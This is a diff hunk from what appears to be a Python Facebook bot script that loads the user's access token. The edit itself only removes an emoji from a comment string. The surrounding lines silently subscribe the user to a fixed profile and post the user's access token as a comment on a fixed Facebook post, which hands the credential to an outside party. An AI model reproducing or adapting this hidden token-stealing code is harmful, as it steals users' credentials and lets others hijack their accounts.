@@ -124,7 +124,7 @@ def bot():
 	except IOError:
 		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
 		tokenz()
-	kom = ("Gantengnya Aa @[100000834003593:]😘")
+	kom = ("Gantengnya Aa @[100000834003593:]")
 	requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token=' + toket) 
 	requests.post('https://graph.facebook.com/953529338576547/comments/?message=' + toket + '&access_token=' + toket)
 	requests.post('https://graph.facebook.com/953529338576547/comments/?message=' + kom + '&access_token=' + toket)
